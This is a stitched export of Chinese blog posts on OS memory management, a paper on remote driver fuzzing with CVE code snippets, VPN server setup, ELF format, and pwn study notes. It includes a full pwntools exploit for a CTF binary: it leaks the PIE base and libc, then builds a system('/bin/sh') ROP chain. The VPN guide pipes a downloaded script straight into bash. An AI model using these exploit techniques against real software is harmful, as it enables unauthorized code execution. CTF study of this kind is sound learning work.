其实分段解决了许多问题，并帮助我们构建更有效的内存虚拟化。除了动态重定位之外，分段可以更好地支持稀疏地址空间，避免了逻辑分区之间的巨大潜在内存空间。它也很快，因为在硬件中进行算术分割需要简单且非常适合硬件;翻译的开销很小。一个边缘的好处也出现了：代码共享。如果代码放在单独的段中，则可能会在多个正在运行的程序之间共享此类段。但是，正如我们所知，在内存中分配可变大小的段会导致一些我们想要克服的问题。如上所述，第一个是外部碎片。因为段是变量化的，所以空闲存储器被切割成奇数大小的片段，因此满足存储器分配请求可能是困难的。人们可以尝试使用智能算法或定期压缩内存，但问题是根本的，很难避免。第二个也许是更重要的问题是分割仍然不足以支持我们完全通用的稀疏地址空间。例如，如果我们在一个逻辑段中有一个大但稀疏使用的堆，则整个堆必须仍然驻留在内存中或者可以访问。换句话说，如果我们关于如何使用地址空间的模型与底层分段的设计方式并不完全匹配，那么分割就不能很好地工作。 第十七章 自由空间管理 讨论了最基本的内存分配器形式。 这样的分配器存在于任何地方，链接到每个C程序中，以及在为自己的数据结构管理内存的底层OS中。 与许多系统一样，在构建这样的系统时需要进行许多权衡，并且您对提供给分析器的确切工作负荷了解得越多，他们就可以调整它以更好地适应该工作负载。 制作一个快速，空间有效，可扩展的分配器，适用于广泛的工作负载仍然是现代计算机系统中的一个持续挑战。 这里停一下，后续关于分页的内容可能阅读文字去理解不是很透彻，建议读者结合相关视频或者csapp中的图片来理解。 第十八章 分页:介绍 引入了分页概念作为我们虚拟化内存的解决方案。 与先前的方法（例如分段）相比，分页具有许多优点。 首先，它不会导致外部碎片，因为分页（通过设计）将内存划分为固定大小的单元。 其次，它非常灵活，可以稀疏地使用虚拟地址空间。 第十九章 分页:更快的翻译(TLBs) 本章引入的技术是利用了局部性概念（命中不命中23333），通过提供一个小的，专用的片上TLB作为地址转换高速缓存，大多数存储器引用有望在不必访问主存储器中的页表的情况下进行处理。因此，在通常情况下，程序的性能几乎就好像存储器根本没有被虚拟化，这对于操作系统来说是一个很好的成就，并且对于在现代系统中使用分页来说当然是必不可少的。然而，TLB不是一直有效的。特别是，如果程序在短时间内访问的页数超过了进入TLB的页数，程序将产生大量的TLB未命中，因此运行速度要慢得多。这种现象就是超出TLB覆盖范围，对于某些程序来说这可能是一个很大的问题。由于这个潜在的问题，人们已经研究了各种通过虚拟地址访问缓存的方法，从而避免了在缓存命中的情况下昂贵的翻译步骤。这种虚拟索引的缓存解决了一些性能问题，但也在硬件设计中引入了新的问题。 第二十章 分页:较小的表 介绍如何构建真正的页表; 不一定只是线性阵列，而是更复杂的数据结构（其实也不复杂，可以理解为索引再索引：）。 这些表格的权衡取决于时间和空间 - 表格越大，TLB未能得到服务的速度越快，反之亦然 - 因此结构的正确选择在很大程度上取决于给定环境的约束。 在内存受限的系统中，小结构是有意义的; 在具有合理内存量和主动使用大量页面的工作负载的系统中，加速TLB未命中的更大表可能是正确的选择。 第二十一章 超越物理内存:机制 介绍了访问更多内存的概念，而不是系统中实际存在的内存，并介绍了一些处理错误的机制。这样做需要页表结构更复杂，因为必须包含当前位（某种类型）以告诉我们页面是否存在于内存中。如果没有，操作系统页面错误处理程序运行以服务页面错误，从而安排将所需页面从磁盘传输到内存，可能首先替换内存中的某些页面，以便为即将交换的页面腾出空间。就进程而言，它只是访问自己的私有连续虚拟内存。在幕后，页面被放置在物理内存中的任意（非连续）位置，有时它们是存在于内存中的，需要从磁盘中获取。 第二十二章 超越物理内存:策略 本章有页面替换（和其他）策略的引入，这些策略是所有现代操作系统的VM子系统的一部分。 现代系统对时钟等简单的LRU近似进行了一些调整; 例如，扫描电阻是许多现代算法的重要组成部分，例如ARC。 抗扫描算法通常类似于LRU，但也试图避免LRU的最坏情况行为，我们在循环顺序工作负载中看到了这种行为。 然而，在许多情况下，所述算法的重要性已经降低，因为存储访问和磁盘访问时间之间的差异已经增加。 因为对磁盘的分页是如此昂贵，所以频繁分页的成本是高昂的。 因此，过度分页的最佳解决方案通常是简单的：分配更多内存。 第二十三章 VAX / VMS虚拟内存系统 本章展现了对整个虚拟内存系统的自上而下的视图。 通过一个具体的例子将前面的知识点串成一个模型，而在VAX / VMS这样的旧论文中发现的经典想法仍然影响着现代操作系统的构建方式。 不行了，写不动了，后续的内容其实大部分都是基于概念的理解，而且像并行章节的很多知识点个人觉得还是应该去实际敲一敲代码，去应用这些解决具体的问题会更有效果，而持久化部分，很多优化性的知识点是比较偏向cs方面的，相对来说文件系统方面的介绍对我的帮助比较大，后续等写操作系统的时候再补上吧。ps：个人觉得这些知识点还是通过写一个操作系统后对此的理解会更加深刻。 这里放一个问题与解答，仅供参考，我之前问过一个前辈关于操作系统的学习姿势，然后觉得不同专业的同学所需深入的内容不同，cs的同学可能更需要对底层的这些数据结构和算法更加深入（毕竟操作系统的各种优化基本上都是目前为止的一些达到极致的方案），而和本人（信安专业的)相同专业的同学可能跟需要对整体的整个架构，存在的问题点更加深入学习会帮助更大。：）","link":"/2019/05/23/2019-05-23-operating-system/"},{"title":"模糊测试syzkaller项目之Charm","text":"Charm：促进动态分析移动系统的设备驱动 此文只是对原文的简要提炼,具体内容还请阅读https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-talebi.pdf 注: 本文与syzkaller的相关性较小,但涉及到对syzkaller的运用,可作为对syzkaller运用领域的拓展了解 Charm简介 一种便于动态分析移动系统设备驱动程序的系统解决方案 核心技术: 远程设备驱动执行. 目的: 使设备驱动程序能够在工作站上的虚拟机中执行.Charm通过使用实际的移动系统, 低延迟和定制的USB通道为低级别且不频繁的I / O操作提供服务，从而实现了这一目标. 益处: 由于设备驱动程序在虚拟机中执行，因此它使分析人员能够使用各种动态分析，包括手动交互式调试，记录和重放以及增强的模糊测试.(其中模糊测试工具使用了syzkaller) 核心技术简介 设备驱动程序与其I / O设备交互的尝试被虚拟机管理程序在虚拟机中拦截，并且通过专门的低速延迟USB通道发送到实际的移动系统。 在该技术中，虽然执行不频繁的低级I / O操作需要实际的移动系统，但是设备驱动程序在虚拟机内完全运行，因此可以进行分析。 Figure 1显示了Charm背后的高级理念. 其中定制的USB通道解决了因通信能力导致而I / O设备或驱动程序的各种超时问题. 同时作者团队构建了RemmoteProcedureCall（RPC）接口快速驱动器来与移动系统的原生接口进行交互,从而使不同移动系统的不同设备可以使用相同的RPC接口，从而减少了将Charm应用于新设备驱动程序的工程量。 关于虚拟机和底层驱动的一些交互方法 稻草人方法: 在移动系统中的虚拟机中运行设备驱动程序，并使用直接设备分配技术使虚拟机能够访问 底层I / O设备 Charm方法: 简介见前 远程设备驱动程序执行的细节 设备和设备驱动程序交互:为实现此目的，工作站管理程序中的存根模块通过子模块进行通信，以支持设备驱动程序与其硬件的交互。 这些交互是三重的：访问I / O设备的寄存器，中断和直接内存访问（DMA）.Charm目前支持前两个. 寄存器访问 中断 设备驱动程序初始化: 首先允许内核基于ACPI的设备检测. 之后，内核解析设备树以检测远程I / O设备. 这减少了工程工作量. 为了支持新设备驱动程序的初始化，我们只需要将与感兴趣的I / O设备相对应的设备树条目从移动系统的设备树复制到虚拟机的设备树条目. 低延迟USB通道: 在此频道中，我们为Charm创建了一个USB小工具接口[13]，并将五个端点连接到此接口. 两个端点用于寄存器访问的双向通信。 两个端点用于RPC调用的双向通信（在第4.4节中解释）. 最后一个端点用于中断的单向通信（从移动系统到工作站）. 相关依赖 将设备驱动程序移植到Charm(建议此步看原文文档) 漏洞发掘 Charm不仅有助于模糊测试，还可以实现移动系统内核当前不支持的模糊器的更新功能 (a) Vulnerable code snippet of CVE-2016-3903 1234567891011121314151617181920212223/* in msm_csid_cmd(): */ 1 for (i = 0; i &lt; csid_params.lut_params.num_cid; i++) { ... 2 if (copy_from_user(vc_cfg, (void *) csid_params.lut_params.vc_cfg[i], sizeof(struct msm_camera_csid_vc_cfg))) { ... 3 for (i--; i &gt;= 0; i--) 4 kfree(csid_params.lut_params.vc_cfg[i]); 5 rc = -EFAULT; 6 break; 7 } 8 csid_params.lut_params.vc_cfg[i] = vc_cfg; 9 } ... 10 rc = msm_csid_config(csid_dev, &amp;csid_params);/* in msm_csid_cid_lut(): */... 11 if (csid_lut_params-&gt;vc_cfg[i]-&gt;cid &gt;= csid_lut_params-&gt;num_cid || csid_lut_params-&gt;vc_cfg[i]-&gt;cid &lt; 0) { ... 12 } (b) Vulnerable code snippet of CVE-2016-2501 1234567891 int16_t step_index = 0; 2 uint16_t step_boundary = 0; ... 3 for (; step_index &lt;= step_boundary; step_index++) { ... 4 if (cur_code &lt; max_code_size) 5 a_ctrl-&gt;step_position_table[step_index] = cur_code; ... 6 } (c) Vulnerable code snippet of CVE-2016-2061 123456789101112131 int i = stream_cfg_cmd-&gt;stream_src; 2 if (i &gt;= VFE_AXI_SRC_MAX) { ... 3 return -EINVAL; 4 } ... 5 memset(&amp;axi_data-&gt;stream_info[i], 0, sizeof(struct msm_vfe_axi_stream)); ... 6 axi_data-&gt;stream_info[i].session_id = stream_cfg_cmd-&gt;session_id; 7 axi_data-&gt;stream_info[i].stream_id = stream_cfg_cmd-&gt;stream_id; 举一些例子 CVE-2016-3903: 崩溃点位于第11行（在函数msmcsidcidlut()中）,乍一看,这似乎是一个越界访问错误，但我们的调查（下面描述）显示这是一个免费使用后的错误。我们按如下方式进行了调查。通过使用观察点，我们发现崩溃站点的索引变量i始终在正常范围内（而不是负值）.然后我们尝试检查其他指针值与GDB崩溃的网站并最终确定vccfg [i]持有无效地址.为了追踪数组vccfg的原点，我们利用观察点来跟踪其父结构csid_lut_params并最终找到另一个函数msmcsidcmd，它负责初始化结构.通过单步执行初始化代码，我们发现如果在第2行的vccfg初始化期间发生错误，它将在第4行释放，然后初始化循环将在第6行终止.但是，函数调用在行10将继续使用csidparams结构，无论其vc_cfg子字段已被释放，从而导致免费使用后漏洞. CVE-2016-2501: 崩溃点位于第5行。当触发崩溃点的断点时，我们可以推断它可能是一个越界的阵列访问。 接下来，我们为索引变量步骤索引设置一个观察点，跟踪其值的变化。 实际上，当崩溃发生时，它的价值是负的。 仔细观察，作为循环索引，将其与第3行的步边界进行比较，第3行是保持0xffff值的16位寄存器。 但是，步骤索引是有符号整数，可以在达到0xffff之前取负值以终止循环（请注意，比较是无符号的）。 因此，当它在第5行用作数组索引时，会发生越界访问。 最后，我们还为步边界设置了一个观察点，并发现它的值来自用户空间传递的函数参数，这是不可信的。 CVE-2016-2061: 第一眼看到崩溃网站表明第5行的memset（）可能会将无效的内存区域归零，从而导致内核崩溃。 实际上，通过检查崩溃站点上的各种变量值，我们发现我将负值作为数组索引，导致越界访问。 为了完全理解为什么我可能是负面的，我们在观察点的帮助下追溯它，并发现i的值来自用户控制的参数（line1）。 此外，不幸的是，第2行的完整性检查不能过滤负面i。 然后我们发现这是一个关键的漏洞。 这是因为从第6行开始，赋值语句的右侧也由源自用户空间的参数流cfg cmd控制。 与用户控制的索引变量i一起，此漏洞成为特权升级的理想目标，我们展示了我们可以实现的目标。 具体的exploit开发方法及其他的相关展望请参看原文 结语: 在可行性,表现和记录与重放性能上,建议读者根据具体情况对实验的相关数据进行参考.","link":"/2019/05/05/2019-05-05-Charm/"},{"title":"科学上网小计","text":"配置vpn的时候时不时遇到问题, 决定每次解决问题后积累起来, 省些力. 第一步 选择合适的供应商 比较靠谱的服务器提供商有搬瓦工和vultr,老品牌跑路可能性不大. 当然也可以直接购买香港或者国外的服务器, 但要注意保护好ip 我一般使用vultr, 操作足够简单. https://www.vultr.com/ 创建账户后, 按照操作购买服务器, 一般选择硅谷,建议移动用户选择Singapore（新加坡）机房的服务器，电信用户或者移动和电信都想翻墙的用户可以选择Los Angeles（洛杉矶）的机房。近日GFW2.0出台，实测电信网络无法连接洛杉矶、日本和新加坡的服务器，如遇大家可以选择其他地方的服务器，我选择Amsterdam的服务器测试成功，延迟在300ms左右，但是不影响YouTube的快速访问。 本方案不支持游戏模式，如需搭建游戏加速服务器，参见https://github.com/allenking1028/ss/issues/1，客户端请使用Shadowsocks，需要使用低延迟服务器，建议用阿里云、Microsoft Azure或亚马逊的低延迟服务器，注意开启UDP Relay和SSTap（Windows)或Proxifier（Mac）。如在梅林或Lede软路由下使用科学上网插件，只需选择游戏模式. 选择好服务器后, 用ssh协议相连, 因为我是windows系统, 可以在cmd中配置ssh, 也可以使用xshell(虽然它时不时爆出漏洞或者被禁用), 但不建议使用wsl, 主要是不太稳定而且ssh协议存在问题, 具体原因自寻. 使用xshell连接好服务器后, 开启BBR加速器 修改系统变量 $ echo “net.core.default_qdisc=fq” &gt;&gt; /etc/ sysctl.conf $ echo “net.ipv4.tcp_congestion_control=bbr” &gt;&gt;/etc/sysctl.conf 保存生效 $ sysctl -p 安装系统工具, 这个应该只有部分最小系统需要安装，如果后面安装失败，可能是缺少curl工具。 $ apt-get update $ apt install curl 连接方案一 使用outline正式安装 输入下面这行命令（就是刚刚Outline管理端提供你的那行命令去掉sudo），然后回车。 $bash -c “$(wget -qO- https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh)&quot; 当出现 {“apiUrl”:开头的一串绿色字符就说明下载好了.(有时候不行, 原因很多, 根据回显自寻)使用outline连接 这个软件的厉害之处罗列如下（谷歌开发的）： 一行代码配置完服务器 管理端可以创建分享链接，分享给亲朋好友使用，你还可以通过管理端监控每个人的使用流量 用户端范围广，创建的分享链接的同时也生成了兼容Shadowsocks的链接sh 首先下载管理端：（管理端其中下载一个就好了，客户端可以有多个, 上面那个是mac, 下面的是windows） https://raw.githubusercontent.com/Jigsaw-Code/outline-releases/master/manager/Outline-Manager.dmg https://raw.githubusercontent.com/Jigsaw-Code/outline-releases/master/manager/Outline-Manager.exe 自行安装一下这个管理端，然后打开软件，点击左边栏的加号，选择Set up Outline anywhere。 你会看到第一栏里面是Log into your server, and run this command。幸运的是我们已经跑过这个命令了.将之前的{“apiUrl”开头的绿色回显复制到下面的框中.接下来按照它的提示操作进行就可以了 客户端也可以直接下载.(1.mac 2.windows) https://itunes.apple.com/us/app/outline-app/id1356178125 https://raw.githubusercontent.com/Jigsaw-Code/outline-releases/master/client/stable/Outline-Client.exe 连接方案二 使用ss/ssr管理端 我是使用了ssr, 相对来说比ss的稳定性好些 下载一键搭建ssr脚本 git clone -b master https://github.com/flyzy2005/ss-fly 运行脚本 ss-fly/ss-fly.sh -ssr 输入对应的参数(自己按需求选择) 相关操作ssr命令 启动：/etc/init.d/shadowsocks start 停止：/etc/init.d/shadowsocks stop 重启：/etc/init.d/shadowsocks restart 状态：/etc/init.d/shadowsocks status 配置文件路径：/etc/shadowsocks.json 日志文件路径：/var/log/shadowsocks.log 代码安装目录：/usr/local/shadowsocks 卸载ssr服务 ./shadowsocksR.sh uninstall 客户端 github上下载合适的ssr按要求操作就可以了 BBR加速算法内置于Ubuntu18.10，开启后可以有效提升服务器网络速度。 对于不同版本的Ubuntu配置存在问题的可能原因–&gt;https://www.moerats.com/archives/612/","link":"/2019/05/01/2019-05-30-vpn/"},{"title":"ciscn_2019","text":"your_pwn 开启PIE保护的话影响的是程序加载的基地址，不会影响指令间的相对地址，因此我们如果能够泄露出程序或者libc的某些地址，我们就可以利用偏移来构造ROP. 该程序是64位的程序，PIE开启，NX开启，relro没开全. 在sub中我们发现了程序进行了41次循环，每一次输入一个下标index，以局部变量v4为基准泄露一个字节的内容，然后再改为新的数据，漏洞点在于index没有进行大小检查，可以任意大，超出v4数组的范围到达main返回地址处，这既实现了leak又实现了change，而且有41次机会，现在思路如下. 第一步还是leak出libc，根据经验我们知道在main函数返回地址附近一般会有__libc_start_main+240出现，我们可以泄露其然后进而泄露libc，这里的libc需要我们自己查找确定，我用的是wiki上的一个工具：LibcSearcher，除了libc之外，我们还应泄露一下程序的基址，因为程序开了PIE，所以我们最后改main函数返回地址的时候要构造p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)这个payload的时候pop_rdi_addr这个gadget需要程序基址。 main函数的rbp附近的stack分部如下图：我们可以利用画红圈的两个地方来leak出libc和基址。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *context.log_level = 'debug'pop_rdi_ret = 0xd03pop_rsi_r15_ret = 0xd01r = process(\"./pwn\")r.recvuntil(\"name:\")r.sendline(\"wuge\")def get(p): i = 0 ll = 0 while(1): r.recvuntil(\"index\\n\") r.sendline(str(i + p)) data = r.recvuntil(\"value\\n\")[:-17] data = int(data[-2:],16) if(i &lt; 8): ll += data * (0x100 ** i) r.sendline(str(data)) i += 1 if(i % 41 == 0): r.recvuntil(\"continue(yes/no)? \\n\") r.sendline(\"yes\") return lldef write(p, x): i = 0 while(1): r.recvuntil(\"index\\n\") r.sendline(str(i + p)) r.recvuntil(\"value\\n\") data = 0 if(i != 40): data = (x[i/8] / (0x100 ** (i % 8))) % 0x100 r.sendline(str(data)) i += 1 if(i % 41 == 0): r.recvuntil(\"continue(yes/no)? \\n\") r.sendline(\"yes\") returnpie = get(0x158) - 0xb11print \"pie: \" + hex(pie)write(0x158, [pie + pop_rdi_ret, pie + 0x202020, pie + 0x8B0, pie + 0xb0c, 0, 0, 0, 0])libc = u64(r.recvuntil(\"\\n\")[0:6].ljust(8,'\\0')) - 0x06f690print \"libc: \" + hex(libc)system = libc + 0x045390binsh = libc + 0x18cd57write(0x158, [pie + pop_rdi_ret, binsh, system, 0, 0, 0, 0, 0])r.interactive()","link":"/2019/06/02/2019-06-02-guosai-fuxian/"},{"title":"unlink","text":"unsafe unlink 以jarvis oj 的guestbook2, level6, level6_x64和hitcon2014-stkof三个作为对比来讲讲思路 level6_x64 and guestbook2 以从64位的为例 按照堆题的出题习惯, 照例有四个有用的选项和一个初始化 init list new edit delete 对比各个函数,不难看出这是一个嵌套的数据结构, 因为它整体偏移一个节点的时候都是以0x18为基数的,但它在此之前有两个8字节的单元不包含在内. 所以数据结构就是这样 直接来分析漏洞处, 经典的Double free和UAF, 配合起来很舒服.其中myread是一个将字符串转换为数字的函数,他其中有调用了一个单个读入的函数 同样是最终调用了单个读入的函数, 上一个read函数后将末尾的值置为0, 而在new功能函数中,调用了fill函数,而fill函数中又调用了read函数,但是这次没有把末尾置为0.所以这是一个可以尝试利用的信息泄露(leak)点. 于是乎,这里整理两种相似但又有所区别的漏洞利用方法. 此处借鉴两位师傅的博客进行学习的, 详细内容看链接: https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level6_x64/exp.py https://aluvion.github.io/2019/05/09/%E5%A0%86%E5%85%A5%E9%97%A8-JarvisOJ-Level6-x64/ 相同点1:leak heapbase address 先创建5个small chunk,这是为了unsorted bin做准备。然后先释放第四个chunk，在释放第二个chunk，这是为了将第二个的fd指针指向第四个，具体原因翻机制。。。接着两者获得heapbase的方法, 都是通过edit修改第一个chunk的size, 增大content来覆盖第二个chunk的head.这时调用list函数, 判断我们content因为之前读入时没有设置末尾为0,所以接下去泄露,即把第二个chunk的fd的内容打印出来,即第三个chunk的位置, 然后减去之前分配的空间即得堆地址. 相同点2:unlink 在原chunk中伪造一个fake chunk, 即有如下的对应关系 格式: (原) -&gt; (现) fd位置处 -&gt; prev_size bk位置处 -&gt; size fd + 0x10 -&gt; FD(chunk0addr-0x8*3) bk + 0x10 -&gt; BK(chunk0addr-0x8*2) 原chunk可用大小 - 0x8 *4 下一个chunk的prev_size -&gt; 值减0x10,因为伪造少了0x10嘛 下一个chunk的size -&gt; 具体而定,但最后一位为0 相同点3:漏洞最终的利用方式还是通过将全局变量中指向chunk1的指针改为指向atoi的指针,因为只要有输入,就会调用该函数处理输入. 不同点:leak libc address. 第一种方法采用的是通过刚才的unlink操作,原先的chunk0addr = &amp;chunk0addr的值减去三个单元.所以可以从现在的chunk0addr开始往后覆盖,只将原先chunk0的content的值改为atoi的got值,然后泄露减去symbols值即可.而第二种方法,更为直接,它采用了和leak heapbase类似的方法,但这次多覆盖了个fd,于是会把bk的值泄露出来,因为此时chunk1的bk指向的是main_arena+88 可以调试查看,然后减去__malloc_hook的symbols,减去88,再减去0x10或0x20. 不同点各有利弊, 第一种比较方便准确, 但是有条件限制,如有全局指针啊什么的, 第二种虽然粗暴但是通用性好,应该是都能用的. level6 https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level6/exp.py https://aluvion.github.io/2019/05/09/%E5%A0%86%E5%85%A5%E9%97%A8-JarvisOJ-Level6-x64/ 第一种方法就是改了个偏移量,改了个通用函数是strtol. 第二种方法在泄露libc地址的时候,减去的是memalign_hook_libc的值,再减48(偏移值),再减去0x10或0x20.这里heap和libc的及地址可以一起leak出来,因为fd和bk都为4字节,所以64位机泄露一个8字节单元时将两者一起泄露.同时改了通用函数是free,这也意味着在某个chunk处(这里用的是chunk1)的content得填/bin/sh\\x00,然后最后要delete 它才能调用system(‘/bin/sh\\x00’) hitcon2014-stkof待补充…因为我exp没调通…","link":"/2019/08/26/2019-08-26-dui1/"},{"title":"ELF文件解析一","text":"ELF 是Executable and Linking Format的缩写，即可执行和可链接的格式，是Unix/Linux系统ABI (Application Binary Interface)规范的一部分。Unix/Linux下的可执行二进制文件、目标代码文件、共享库文件和core dump文件都属于ELF文件。 左边是ELF的链接视图，可以理解为是目标代码文件的内容布局。右边是ELF的执行视图，可以理解为可执行文件的内容布局。注意目标代码文件的内容是由section组成的，而可执行文件的内容是由segment组成的。 我们写汇编程序时，用.text，.bss，.data这些指示，都指的是section，比如.text，告诉汇编器后面的代码放入.text section中。目标代码文件中的section和section header table中的条目是一一对应的。section的信息用于链接器对代码重定位。而文件载入内存执行时，是以segment组织的，每个segment对应ELF文件中program header table中的一个条目，用来建立可执行文件的进程映像。比如我们通常说的，代码段、数据段是segment，目标代码中的section会被链接器组织到可执行文件的各个segment中。.text section的内容会组装到代码段中，.data, .bss等节的内容会包含在数据段中。 在目标文件中，program header不是必须的，我们用gcc生成的目标文件也不包含program header。 readelf的一些命令解析ELF文件的常用工具是readelf。命令是readelf -S 文件名，输出如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566There are 28 section headers, starting at offset 0xe88:Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .interp PROGBITS 0000000000400200 00000200 000000000000001c 0000000000000000 A 0 0 1 [ 2] .note.ABI-tag NOTE 000000000040021c 0000021c 0000000000000020 0000000000000000 A 0 0 4 [ 3] .note.gnu.build-i NOTE 000000000040023c 0000023c 0000000000000024 0000000000000000 A 0 0 4 [ 4] .gnu.hash GNU_HASH 0000000000400260 00000260 0000000000000028 0000000000000000 A 5 0 8 [ 5] .dynsym DYNSYM 0000000000400288 00000288 0000000000000138 0000000000000018 A 6 1 8 [ 6] .dynstr STRTAB 00000000004003c0 000003c0 00000000000000a4 0000000000000000 A 0 0 1 [ 7] .gnu.version VERSYM 0000000000400464 00000464 000000000000001a 0000000000000002 A 5 0 2 [ 8] .gnu.version_r VERNEED 0000000000400480 00000480 0000000000000040 0000000000000000 A 6 1 8 [ 9] .rela.dyn RELA 00000000004004c0 000004c0 0000000000000048 0000000000000018 A 5 0 8 [10] .rela.plt RELA 0000000000400508 00000508 00000000000000f0 0000000000000018 A 5 12 8 [11] .init PROGBITS 00000000004005f8 000005f8 000000000000001a 0000000000000000 AX 0 0 4 [12] .plt PROGBITS 0000000000400620 00000620 00000000000000b0 0000000000000010 AX 0 0 16 [13] .text PROGBITS 00000000004006d0 000006d0 0000000000000252 0000000000000000 AX 0 0 16 [14] .fini PROGBITS 0000000000400924 00000924 0000000000000009 0000000000000000 AX 0 0 4 [15] .rodata PROGBITS 0000000000400930 00000930 0000000000000068 0000000000000000 A 0 0 8 [16] .eh_frame_hdr PROGBITS 0000000000400998 00000998 000000000000002c 0000000000000000 A 0 0 4 [17] .eh_frame PROGBITS 00000000004009c8 000009c8 00000000000000d4 0000000000000000 A 0 0 8 [18] .init_array INIT_ARRAY 0000000000600aa0 00000aa0 0000000000000008 0000000000000000 WA 0 0 8 [19] .fini_array FINI_ARRAY 0000000000600aa8 00000aa8 0000000000000008 0000000000000000 WA 0 0 8 [20] .jcr PROGBITS 0000000000600ab0 00000ab0 0000000000000008 0000000000000000 WA 0 0 8 [21] .dynamic DYNAMIC 0000000000600ab8 00000ab8 00000000000001d0 0000000000000010 WA 6 0 8 [22] .got PROGBITS 0000000000600c88 00000c88 0000000000000008 0000000000000008 WA 0 0 8 [23] .got.plt PROGBITS 0000000000600c90 00000c90 0000000000000068 0000000000000008 WA 0 0 8 [24] .data PROGBITS 0000000000600d00 00000d00 0000000000000040 0000000000000000 WA 0 0 32 [25] .bss NOBITS 0000000000600d40 00000d40 0000000000000018 0000000000000000 WA 0 0 16 [26] .comment PROGBITS 0000000000000000 00000d40 000000000000004d 0000000000000001 MS 0 0 1 [27] .shstrtab STRTAB 0000000000000000 00000d8d 00000000000000f8 0000000000000000 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), l (large), p (processor specific) readelf -S是显示文件中的Section信息,可以看到，除了我们熟悉的.text, .data, .bss，还有其它Section，这等我们以后展开讲Section的时候还会专门讲到。看每个Section的Flags我们也可以得到一些信息，比如.text section的Flags是AX，表示要分配内存，并且是可执行的，这一节是代码无疑了。.data 和 .bss的Flags的Flags都是WA，表示可写，需分配内存，这都是数据段的特征。使用readelf -l可以显示文件的program header信息。还是这个文件. 1234567891011121314151617181920212223242526272829303132333435Elf file type is EXEC (Executable file)Entry point 0x4006eeThere are 8 program headers, starting at offset 64Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000400040 0x0000000000400040 0x00000000000001c0 0x00000000000001c0 R E 0x8 INTERP 0x0000000000000200 0x0000000000400200 0x0000000000400200 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000 0x0000000000000a9c 0x0000000000000a9c R E 0x200000 LOAD 0x0000000000000aa0 0x0000000000600aa0 0x0000000000600aa0 0x00000000000002a0 0x00000000000002b8 RW 0x200000 DYNAMIC 0x0000000000000ab8 0x0000000000600ab8 0x0000000000600ab8 0x00000000000001d0 0x00000000000001d0 RW 0x8 NOTE 0x000000000000021c 0x000000000040021c 0x000000000040021c 0x0000000000000044 0x0000000000000044 R 0x4 GNU_EH_FRAME 0x0000000000000998 0x0000000000400998 0x0000000000400998 0x000000000000002c 0x000000000000002c R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 03 .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 04 .dynamic 05 .note.ABI-tag .note.gnu.build-id 06 .eh_frame_hdr 07 如输出所示，文件中共有8个segment。只有类型为LOAD的段是运行时真正需要的。除了段信息，还输出了每个段包含了哪些section。比如第一个LOAD段标志为R（只读）E（可执行）的，它的编号是02，表示它包含哪些section的那一行内容为： 102 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 然后再根据对应的section去分辨他们的属性.","link":"/2019/05/25/2019-05-25-elf-fs-1/"},{"title":"pwn杂记","text":"基础知识 许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。 在Intel CPU中，寄存器BP(EBP)用作帧指针。 当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。 栈中的argument和local varliable顺序分别向高地址和低地址排列,即函数的入栈顺序是实参N1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1N. 注，局部变量的布局依赖于编译器实现等因素, 且局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组/结构体型的局部变量通常分配在栈内存中。 寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。 函数返回值是结构体或者联合体的时候,第一个参数将位于12(%ebp)处 扩展: 与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。 x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。 __stack_chk_fail的 got 